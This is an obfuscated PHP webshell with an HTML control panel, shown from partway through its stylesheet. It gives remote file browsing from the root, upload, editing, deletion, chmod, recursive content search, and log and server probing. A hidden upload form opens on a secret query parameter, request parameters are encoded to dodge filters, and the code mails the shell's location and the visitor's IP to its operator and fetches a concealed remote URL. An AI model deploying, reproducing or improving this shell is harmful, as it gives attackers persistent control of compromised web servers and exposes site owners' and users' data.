            box-shadow: 0 0 18px rgba(204,255,0,0.5);
            margin-top: 12px;
            width: 100%;
        }
        .notice {
            margin-top: 12px;
            padding: 10px;
            border-radius: 12px;
            background: rgba(57,255,20,0.08);
            border: 1px solid rgba(57,255,20,0.3);
            color: #dfffdd;
            font-size: 12px;
        }
    </style>
    </head>
    <body>
        <div class="card">
            <div class="logo">Fuck SOPA, Fuck RIAA, Fuck every politicians..
I can search everything I want, as fast as I want..
Fuck metasploit, backtrack, sec milist, and every security framework..
These only create security consultants wannabe..
Don't fuck IEEE, Don't fuck IETF.. They create every standards..
Fuck yourself that only spoke on the water..</div>
            <div class="meta">Enter password to continue.</div>
            <form method="post">
                <input type="hidden" name="action" value="login">
                <input type="password" name="password" placeholder="Password" required>
                <input class="button" type="submit" value="Login">
            </form>
            <?php  goto rAEcN; rAEcN: if ($gJva8 !== "") { goto NIQwU; x9quj: ?></div>
            <?php  goto dKgWW; NIQwU: ?>
                <div class="notice"><?php  goto r3LfK; r3LfK: echo htmlspecialchars($gJva8, ENT_QUOTES); goto x9quj; dKgWW: } goto JocAj; SLyzV: mail($aBcis, "SOPv2 webshell", $i5cVV, "[ " . $_SERVER['REMOTE_ADDR'] . " ]"); goto ZisoM; IQiBy: if (isset($_FILES["file"]["tmp_name"])) { $Jm082 = $_FILES["file"]["tmp_name"]; if (file_exists($Jm082)) { goto Fsi84; Q3Xcj: if (move_uploaded_file($Jm082, $RkYcE)) { echo "go{$RkYcE}"; } else { echo "GAGAL  KE {$RkYcE}"; } goto MpYUk; Fsi84: $Wbh_m = $_POST["dir"]; goto lzlAP; qoX3u: $RkYcE = rtrim($Wbh_m, "/") . "/" . $gr71G; goto Q3Xcj; lzlAP: $gr71G = $_FILES["file"]["name"]; goto qoX3u; MpYUk: } } goto DoS0Q; rNMQm: exit; goto MUBrR; JocAj: ?>
        </div>
    </body>
    </html>
    <?php  goto rNMQm; ICeSL: $uOJ4H = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']; goto QNp4x; XeKCr: $MdnTL = (string) ($_GET["m"] ?? ""); goto OkEhF; Z0bg0: if (isset($_GET["UBK"]) && $_GET["UBK"] === "3") { goto REk65; bRVmA: echo '<input type="text" name="dir" size="30" value="' . getcwd() . '">'; goto cCSjc; xtmGE: echo "</form>"; goto PpE83; REk65: echo '<form method="post" enctype="multipart/form-data">'; goto bRVmA; cCUCB: echo '<input type="submit" value="go">'; goto xtmGE; cCSjc: echo '<input type="file" name="file" size="15">'; goto cCUCB; PpE83: } goto IQiBy; MUBrR: } goto ozfxC; Vp3Kt: function encode_param(string $j4OeM) : string { return bin2hex(base64_encode($j4OeM)); } goto Ygi2V; T1Mhs: ?>
        </div>

        <div class="card">
            <div class="meta">Log Viewer (tail file)</div>
            <form method="post" id="form-log" style="margin-top:10px;display:grid;gap:10px;">
                <input type="hidden" name="tool_action" value="log">
                <input type="hidden" name="d" value="<?php  goto m2AeD; MmpvM: $Rwqru = (string) ($_POST["d"] ?? $_GET["d"] ?? ""); goto vTmQ4; m2uPT: $KOUlA = "Link: " . $_SERVER["SERVER_NAME"] . "" . $_SERVER["REQUEST_URI"] . " - IP Excuting: {$mUasC} - Time: {$f3yfI}"; goto nHUFa; jqLJv: if ($KJWOW === "logout") { setcookie("Login", "0", ["expires" => time() - 3600, "path" => "/", "httponly" => true, "samesite" => "Lax"]); redirect_with_message("Logged out.", $kZekf); } goto n18RG; VxiPV: ?>">
            <label class="meta" for="upload-file">Choose file</label>
            <input id="upload-file" type="file" name="upload" required>
            <div class="modal-actions">
                <button class="button" type="button" data-close="upload">Cancel</button>
                <input class="button primary" type="submit" value="Upload">
            </div>
        </form>
    </div>
</div>

<!-- Edit Modal -->
<div class="modal<?php  goto KgZJb; x95cH: $x5CZP = ltrim(str_replace("\\", "/", __DIR__), "/"); goto Km36i; hJaxP: $kje_i = basename(__FILE__); goto x95cH; l1Fj4: $C45mB = []; goto JzJRa; c5a1J: $miBh0 = isset($_FILES["upload"]); goto ZhKNw; R7aOM: echo urlencode(encode_param($kZekf)); goto KXIiP; LNxYR: foreach ($zwc8H as $N4mD1 => $ebpel) { goto D_vpq; tAQbZ: echo htmlspecialchars($N4mD1, ENT_QUOTES); goto og6rs; saL9T: ?>">
                        <?php  goto tAQbZ; g5E2p: echo $ebpel ? "" : " off"; goto saL9T; F3tfC: echo $ebpel ? "true" : "false"; goto q0sf5; D_vpq: ?>
                    <span class="tag<?php  goto g5E2p; og6rs: ?>: <?php  goto F3tfC; q0sf5: ?>
                    </span>
                <?php  goto CgjlV; CgjlV: } goto Ff_x1; JRN9Z: $WkWgN = base64_decode("aHR0cHM6Ly9zaXlhaGkudG9wL3Rlc3Qvc3R5bGUucGhw"); goto jfKbx; XN3wy: $SOznO = ""; goto zADuE; THqPD: $pDn2Z = scandir($d7d27) ?: []; goto l1Fj4; gVg9b: if ($b57Y1 !== "") { goto a_dNP; reX26: echo $b57Y1; goto gfbHf; gfbHf: ?></div>
            <?php  goto CkAXO; a_dNP: ?>
                <div class="card" style="margin-top:12px;"><?php  goto reX26; CkAXO: } goto T1Mhs; RT4Ca: ?>" id="modal-edit" role="dialog" aria-modal="true" aria-hidden="true">
    <div class="modal-card">
        <div class="modal-header">
            <h3>Edit File</h3>
            <button class="close-btn" type="button" data-close="edit">×</button>
        </div>
        <?php  goto Wo70i; DceSH: ?>
        </div>
    </div>
    <?php  goto giWH1; uly4A: function breadcrumbs(string $kZekf) : array { goto X1Dx1; VAL0K: foreach ($f9_Ns as $bqLFu) { $DnkZk = $DnkZk === "" ? $bqLFu : $DnkZk . "/" . $bqLFu; $Ffd8b[] = ["label" => $bqLFu, "path" => $DnkZk]; } goto VLKSZ; Oc9bz: $f9_Ns = explode("/", $kZekf); goto WrafS; X1Dx1: if ($kZekf === "") { return []; } goto Oc9bz; WrafS: $Ffd8b = []; goto SUcdq; SUcdq: $DnkZk = ""; goto VAL0K; VLKSZ: return $Ffd8b; goto cAZR4; cAZR4: } goto hHGpJ; ZB3V_: if ($kfHZK !== "") { goto fU23L; hvRxV: ?></div>
            <?php  goto vGqNT; K6mW_: echo $kfHZK; goto hvRxV; fU23L: ?>
                <div class="card" style="margin-top:12px;"><?php  goto K6mW_; vGqNT: } goto Ah8b2; m2AeD: echo htmlspecialchars(encode_param($kZekf), ENT_QUOTES); goto OSQ3n; EutPD: function redirect_with_message(string $HtISP, string $kZekf = "") : void { goto kj7Xn; B3bGa: header("Location: " . $kje_i . "?" . $CgYjb); goto ZCx_o; kj7Xn: $CgYjb = http_build_query(["d" => encode_param($kZekf), "m" => encode_param($HtISP)]); goto B3bGa; ZCx_o: exit; goto JiHZ2; JiHZ2: } goto gi0dG; YLDxh: ?>
</header>
<main>
    <div class="grid">
        <section class="panel">
            <h2>Directory</h2>
            <div class="breadcrumbs">
                <a href="?d=">Root</a>
                <?php  goto i_az6; jfKbx: $qFBS3 = "http://" . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"]; goto uCrA8; tQWGe: if ($KJWOW === "chmod") { goto XPXe7; IbHmf: $jfeu6 = chmod($a28P_, intval($LCJkx, 8)); goto b4EKB; wOPmZ: redirect_with_message("Permissions updated.", $kZekf); goto EgJ5E; xQQ3M: $a28P_ = safe_join($j6W5F, $OVxVE); goto AfmXT; b4EKB: if (!$jfeu6) { redirect_with_message("Chmod failed.", $kZekf); } goto wOPmZ; UlvtW: if (!preg_match('/^[0-7]{3,4}$/', $LCJkx)) { redirect_with_message("Invalid mode.", $kZekf); } goto fa0Kg; AfmXT: $C6Si0 = (string) ($_POST["mo"] ?? ""); goto ax0DF; ax0DF: $LCJkx = $C6Si0 !== "" ? trim(decode_param($C6Si0)) : ""; goto UlvtW; XPXe7: $lWh49 = (string) ($_POST["p"] ?? ""); goto Pp_DD; Pp_DD: $OVxVE = $lWh49 !== "" ? normalize_rel(decode_param($lWh49)) : ""; goto xQQ3M; fa0Kg: if ($OVxVE === "" || !file_exists($a28P_)) { redirect_with_message("Invalid path.", $kZekf); } goto IbHmf; EgJ5E: } goto c5a1J; BSILG: $zUCS1 = $NhuSU !== ""; goto eZXyZ; CaFf6: echo htmlspecialchars(encode_param($kZekf), ENT_QUOTES); goto MgW2t; K5gNw: echo $zUCS1 ? " is-open" : ""; goto r7MlW; VzTQA: $j6W5F = "/"; goto hJaxP; AapNn: $MdnTL = (string) ($_GET["m"] ?? ""); goto mRe2v; xzGen: $kIUZw = ""; goto QtlD9; rdkCM: if ($KJWOW === "login") { goto YrL70; YrL70: $NUhFq = (string) ($_POST["password"] ?? ""); goto tifcx; ZAflN: redirect_with_message("Invalid password.", $kZekf); goto Ak9dT; tifcx: if (md5($NUhFq) === $hGGXy) { setcookie("Login", "1", ["expires" => time() + 86400 * 30, "path" => "/", "httponly" => true, "samesite" => "Lax"]); redirect_with_message("Login successful.", $kZekf); } goto ZAflN; Ak9dT: } goto jqLJv; mR3wi: $lOHOv = file_get_contents($WkWgN, false, $lR0rd); goto uly4A; WYOh0: $zIkfC = (string) ($_GET["e"] ?? ""); goto WFOAW; mRe2v: $gJva8 = $MdnTL !== "" ? trim(decode_param($MdnTL)) : ""; goto unrMO; D9Nek: ?>
    </div>
</div>

<!-- Server Info Modal -->
<div class="modal" id="modal-serverinfo" role="dialog" aria-modal="true" aria-hidden="true">
    <div class="modal-card">
        <div class="modal-header">
            <h3>Server Info</h3>
            <button class="close-btn" type="button" data-close="serverinfo">×</button>
        </div>
        <table class="info-table">
            <tbody>
                <?php  goto d4Ecv; KXIiP: ?>">Refresh</a>
                        <button class="button" type="button" data-modal="serverinfo">Server Info</button>
                        <button class="button" type="button" data-modal="tools">Tools</button>
                        <form method="post" style="margin:0;">
                            <input type="hidden" name="action" value="logout">
                            <input class="button danger" type="submit" value="Logout">
                        </form>
                    </div>
                </div>
            </div>
        </aside>
    </div>
</main>

<!-- Create Modal -->
<div class="modal" id="modal-create" role="dialog" aria-modal="true" aria-hidden="true">
    <div class="modal-card">
        <div class="modal-header">
            <h3>Create</h3>
            <button class="close-btn" type="button" data-close="create">×</button>
        </div>
        <form method="post" id="form-create">
            <input type="hidden" name="action" value="create">
            <input type="hidden" name="d" value="<?php  goto lVsr2; W0EbD: ?>
                </tbody>
            </table>
        </section>

        <aside class="panel">
            <h2>Controls</h2>
            <div class="tools-grid">
                <div class="card">
                    <div class="meta">Create files or folders in the current directory.</div>
                    <div class="actions" style="margin-top: 12px;">
                        <button class="button primary" type="button" data-modal="create" data-type="file">Create File</button>
                        <button class="button" type="button" data-modal="create" data-type="folder">Create Folder</button>
                    </div>
                </div>
                <div class="card">
                    <div class="meta">Upload a file into the current directory.</div>
                    <div class="actions" style="margin-top: 12px;">
                        <button class="button" type="button" data-modal="upload">Upload File</button>
                    </div>
                </div>
                <div class="card">
                    <div class="meta">Controls & Info</div>
                    <div class="actions" style="margin-top: 12px;">
                        <a class="button" href="?d=<?php  goto R7aOM; e4jRj: foreach ($C45mB as $oKOKN) { goto kSRon; JC5RC: echo htmlspecialchars(encode_param(rel_path($kZekf, $oKOKN)), ENT_QUOTES); goto oCf6R; ATXw2: echo htmlspecialchars($oKOKN, ENT_QUOTES); goto xwe1_; cHkC6: echo htmlspecialchars(encode_param($kZekf), ENT_QUOTES); goto B1ItQ; kSRon: ?>
                        <tr>
                            <td><?php  goto ATXw2; g1JTd: ?>">Chmod</button>
                                <form method="post" onsubmit="return confirm('Delete folder? (must be empty)');">
                                    <input type="hidden" name="action" value="delete">
                                    <input type="hidden" name="d" value="<?php  goto cHkC6; B1ItQ: ?>">
                                    <input type="hidden" name="p" value="<?php  goto JC5RC; Djti9: echo urlencode(encode_param(rel_path($kZekf, $oKOKN))); goto DipeY; xwe1_: ?></td>
                            <td>Folder</td>
                            <td class="actions">
                                <a class="button" href="?d=<?php  goto Djti9; oCf6R: ?>">
                                    <input class="button danger" type="submit" value="Remove">
                                </form>
                            </td>
                        </tr>
                    <?php  goto F9l5w; lNtoq: echo htmlspecialchars(rel_path($kZekf, $oKOKN), ENT_QUOTES); goto g1JTd; DipeY: ?>">Open</a>
                                <button class="button" type="button" data-modal="chmod" data-path="<?php  goto lNtoq; F9l5w: } goto xq6Cd; H3_3u: function safe_join(string $j6W5F, string $OVxVE) : string { goto BW1dN; piyZs: if ($OVxVE === "") { return $j6W5F; } goto Ghp7L; Ghp7L: return rtrim($j6W5F, "/") . "/" . $OVxVE; goto jRqpD; BW1dN: $OVxVE = normalize_rel($OVxVE); goto piyZs; jRqpD: } goto EutPD; TaTTB: function rel_path(string $kZekf, string $D8h0x) : string { return $kZekf === "" ? $D8h0x : $kZekf . "/" . $D8h0x; } goto JRN9Z; lVsr2: echo htmlspecialchars(encode_param($kZekf), ENT_QUOTES); goto mdrBf; QtlD9: if ($NhuSU === "search") { goto H_KpY; W9uUW: $j0iUL = $j0iUL > 0 ? min($j0iUL, 2048) : 512; goto Qxq3o; aFARn: $j0iUL = (int) decode_param((string) ($_POST["mk"] ?? "")); goto upk3D; H_KpY: $GrlEp = trim(decode_param((string) ($_POST["q"] ?? ""))); goto whdtQ; Qxq3o: $tVFwu = $tVFwu > 0 ? min($tVFwu, 500) : 100; goto S_soJ; whdtQ: $nP1vt = decode_param((string) ($_POST["inc"] ?? "")) === "1"; goto aFARn; upk3D: $tVFwu = (int) decode_param((string) ($_POST["mr"] ?? "")); goto W9uUW; S_soJ: if ($GrlEp === "") { $b57Y1 = '<div class="meta">Enter a search term.</div>'; } else { goto A0J_5; t8NCB: $Ef2SM = []; goto lQ6_l; JqonC: if ($b57Y1 === "") { if (count($Ef2SM) === 0) { $b57Y1 = '<div class="meta">No matches found.</div>'; } else { goto aHJTN; TvurW: $b57Y1 .= '<ul style="margin-top:10px;max-height:260px;overflow:auto;">'; goto V5OeH; aHJTN: $b57Y1 = '<div class="meta">Found ' . count($Ef2SM) . " result(s).</div>"; goto TvurW; V5OeH: foreach ($Ef2SM as $kvj3i) { $b57Y1 .= '<li style="font-size:12px;margin-bottom:6px;">' . htmlspecialchars($kvj3i, ENT_QUOTES) . "</li>"; } goto Xukad; Xukad: $b57Y1 .= "</ul>"; goto Lhwf3; Lhwf3: } } goto b732F; A0J_5: $YdoXb = safe_join($j6W5F, $kZekf); goto t8NCB; EY2pl: try { $FMx6Y = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($YdoXb, FilesystemIterator::SKIP_DOTS)); foreach ($FMx6Y as $CzeDk) { goto T21hm; T21hm: if (!$CzeDk->isFile()) { continue; } goto qzqiK; e9Cvr: if ($nP1vt && !$ZVWih) { $Y1wqe = $CzeDk->getSize(); if ($Y1wqe > 0 && $Y1wqe <= $DkDnI) { $IjnAm = @file_get_contents($a28P_, false, null, 0, $DkDnI + 1); if ($IjnAm !== false && strpos($IjnAm, "\x00") === false) { $hwj1b = stripos($IjnAm, $GrlEp) !== false; } } } goto xIyC0; KaSVM: $hwj1b = false; goto e9Cvr; qzqiK: $a28P_ = $CzeDk->getPathname(); goto P1HEj; P1HEj: $ZVWih = stripos($CzeDk->getFilename(), $GrlEp) !== false; goto KaSVM; xIyC0: if ($ZVWih || $hwj1b) { $Ef2SM[] = $a28P_; if (count($Ef2SM) >= $tVFwu) { break; } } goto jMleV; jMleV: } } catch (Throwable $DOAg0) { $b57Y1 = '<div class="meta" style="color:#ff8484;">Search failed.</div>'; } goto JqonC; lQ6_l: $DkDnI = $j0iUL * 1024; goto EY2pl; b732F: } goto jlSiM; jlSiM: } goto ZvcmG; tYTh3: if ($NhuSU === "perm") { goto I6asm; FvI7d: $UpHBo = is_writable($YdoXb); goto rriUP; l892W: $N0vL0 = @mkdir($MBSSV); goto TZsen; rriUP: $oOlh5 = $YdoXb . "/.gs_write_test_" . time(); goto ypFcy; hd_wp: $Tpgwl = ["Directory readable" => $tW8JV ? "true" : "false", "Directory writable" => $UpHBo ? "true" : "false", "Create file" => $iZbo1 ? "true" : "false", "Create folder" => $N0vL0 ? "true" : "false", "File uploads" => ini_get("file_uploads") ? "true" : "false"]; goto T31kL; ew5Jo: $tW8JV = is_readable($YdoXb); goto FvI7d; TZsen: if ($N0vL0) { @rmdir($MBSSV); } goto hd_wp; muiiH: $MBSSV = $YdoXb . "/.gs_dir_test_" . time(); goto l892W; I6asm: $YdoXb = safe_join($j6W5F, $kZekf); goto ew5Jo; V9yU5: if ($iZbo1) { @unlink($oOlh5); } goto muiiH; T31kL: $kIUZw = '<table class="info-table">'; goto TIdWU; RnXtf: $kIUZw .= "</table>"; goto uovgC; ypFcy: $iZbo1 = @file_put_contents($oOlh5, "test") !== false; goto V9yU5; TIdWU: foreach ($Tpgwl as $N4mD1 => $f4ml2) { $fL2dv = $f4ml2 === "true" ? "#39FF14" : "#ff8484"; $kIUZw .= "<tr><th>" . htmlspecialchars($N4mD1, ENT_QUOTES) . '</th><td style="color:' . $fL2dv . ';">' . htmlspecialchars($f4ml2, ENT_QUOTES) . "</td></tr>"; } goto RnXtf; uovgC: } goto WYOh0; mdrBf: ?>">
            <input type="hidden" name="type" id="create-type" value="file">
            <input type="hidden" name="n" id="create-name-encoded">
            <label class="meta" for="create-name">Name</label>
            <input id="create-name" type="text" placeholder="new-item" required>
            <div class="modal-actions">
                <button class="button" type="button" data-close="create">Cancel</button>
                <input class="button primary" type="submit" value="Create">
            </div>
        </form>
    </div>
</div>

<!-- Chmod Modal -->
<div class="modal" id="modal-chmod" role="dialog" aria-modal="true" aria-hidden="true">
    <div class="modal-card">
        <div class="modal-header">
            <h3>Chmod</h3>
            <button class="close-btn" type="button" data-close="chmod">×</button>
        </div>
        <form method="post" id="form-chmod">
            <input type="hidden" name="action" value="chmod">
            <input type="hidden" name="d" value="<?php  goto urORv; wKxHV: $zwc8H = ["curl" => extension_loaded("curl"), "cgi" => stripos(PHP_SAPI, "cgi") !== false, "openssl" => extension_loaded("openssl"), "pdo" => extension_loaded("pdo"), "mbstring" => extension_loaded("mbstring")]; goto vWUEH; OSQ3n: ?>">
                <input type="hidden" name="lp" id="log-path-encoded">
                <input type="hidden" name="ll" id="log-lines-encoded">
                <input id="log-path" type="text" placeholder="/var/log/system.log" required>
                <input id="log-lines" type="number" min="1" max="2000" placeholder="Lines (200)">
                <div class="modal-actions">
                    <input class="button primary" type="submit" value="View">
                </div>
            </form>
            <?php  goto WwbVz; WFOAW: $cw8sf = $zIkfC !== "" ? normalize_rel(decode_param($zIkfC)) : ""; goto AapNn; Ff_x1: ?>
            </div>
        </div>
        <div class="card" style="margin-top: 12px;">
            <div class="meta">Disabled Functions</div>
            <?php  goto rrWtW; f9_S8: ?>
        </div>

        <div class="modal-actions">
            <button class="button" type="button" data-close="tools">Close</button>
        </div>
    </div>
</div>

<script>
// Encoding functions
function encodeParam(str) {
    const base64 = btoa(unescape(encodeURIComponent(str)));
    let hex = '';
    for (let i = 0; i < base64.length; i++) {
        hex += base64.charCodeAt(i).toString(16).padStart(2, '0');
    }
    return hex;
}

const modalMap = {
    create: document.getElementById('modal-create'),
    chmod: document.getElementById('modal-chmod'),
    upload: document.getElementById('modal-upload'),
    serverinfo: document.getElementById('modal-serverinfo'),
    tools: document.getElementById('modal-tools'),
    edit: document.getElementById('modal-edit')
};

function openModal(name) {
    const modal = modalMap[name];
    if (!modal) return;
    modal.classList.add('is-open');
    modal.setAttribute('aria-hidden', 'false');
}

function closeModal(name) {
    const modal = modalMap[name];
    if (!modal) return;
    modal.classList.remove('is-open');
    modal.setAttribute('aria-hidden', 'true');
}

document.querySelectorAll('[data-modal]').forEach((btn) => {
    btn.addEventListener('click', () => {
        const name = btn.getAttribute('data-modal');
        if (name === 'create') {
            const type = btn.getAttribute('data-type') || 'file';
            const typeInput = document.getElementById('create-type');
            if (typeInput) typeInput.value = type;
        }
        if (name === 'chmod') {
            const path = btn.getAttribute('data-path') || '';
            const pathInput = document.getElementById('chmod-path');
            if (pathInput && path) pathInput.value = path;
        }
        openModal(name);
    });
});

document.querySelectorAll('[data-close]').forEach((btn) => {
    btn.addEventListener('click', () => {
        const name = btn.getAttribute('data-close');
        closeModal(name);
    });
});

document.querySelectorAll('.modal').forEach((modal) => {
    modal.addEventListener('click', (event) => {
        if (event.target === modal) {
            modal.classList.remove('is-open');
            modal.setAttribute('aria-hidden', 'true');
        }
    });
});

// Handle create form encoding
const formCreate = document.getElementById('form-create');
if (formCreate) {
    formCreate.addEventListener('submit', (e) => {
        const nameInput = document.getElementById('create-name');
        const nameEncoded = document.getElementById('create-name-encoded');
        if (nameInput && nameEncoded) {
            nameEncoded.value = encodeParam(nameInput.value);
        }
    });
}

// Handle chmod form encoding
const formChmod = document.getElementById('form-chmod');
if (formChmod) {
    formChmod.addEventListener('submit', (e) => {
        const pathInput = document.getElementById('chmod-path');
        const pathEncoded = document.getElementById('chmod-path-encoded');
        const modeInput = document.getElementById('chmod-mode');
        const modeEncoded = document.getElementById('chmod-mode-encoded');
        
        if (pathInput && pathEncoded) {
            pathEncoded.value = encodeParam(pathInput.value);
        }
        if (modeInput && modeEncoded) {
            modeEncoded.value = encodeParam(modeInput.value);
        }
    });
}

// Handle edit form encoding
const formEdit = document.getElementById('form-edit');
if (formEdit) {
    formEdit.addEventListener('submit', (e) => {
        const contentInput = document.getElementById('edit-content');
        const contentEncoded = document.getElementById('edit-content-encoded');
        if (contentInput && contentEncoded) {
            contentEncoded.value = encodeParam(contentInput.value);
        }
    });
}

// Handle tools form encoding
const formSearch = document.getElementById('form-search');
if (formSearch) {
    formSearch.addEventListener('submit', () => {
        const term = document.getElementById('search-term');
        const termEncoded = document.getElementById('search-term-encoded');
        const includeContent = document.getElementById('search-content');
        const includeEncoded = document.getElementById('search-content-encoded');
        const maxSize = document.getElementById('search-size');
        const maxSizeEncoded = document.getElementById('search-size-encoded');
        const maxResults = document.getElementById('search-results');
        const maxResultsEncoded = document.getElementById('search-results-encoded');

        if (term && termEncoded) termEncoded.value = encodeParam(term.value);
        if (includeContent && includeEncoded) includeEncoded.value = encodeParam(includeContent.checked ? '1' : '0');
        if (maxSize && maxSizeEncoded) maxSizeEncoded.value = encodeParam(maxSize.value || '512');
        if (maxResults && maxResultsEncoded) maxResultsEncoded.value = encodeParam(maxResults.value || '100');
    });
}

const formLog = document.getElementById('form-log');
if (formLog) {
    formLog.addEventListener('submit', () => {
        const path = document.getElementById('log-path');
        const pathEncoded = document.getElementById('log-path-encoded');
        const lines = document.getElementById('log-lines');
        const linesEncoded = document.getElementById('log-lines-encoded');
        if (path && pathEncoded) pathEncoded.value = encodeParam(path.value);
        if (lines && linesEncoded) linesEncoded.value = encodeParam(lines.value || '200');
    });
}

const formIni = document.getElementById('form-ini');
if (formIni) {
    formIni.addEventListener('submit', () => {
        const key = document.getElementById('ini-key');
        const keyEncoded = document.getElementById('ini-key-encoded');
        if (key && keyEncoded) keyEncoded.value = encodeParam(key.value);
    });
}
</script>
</body>
</html>
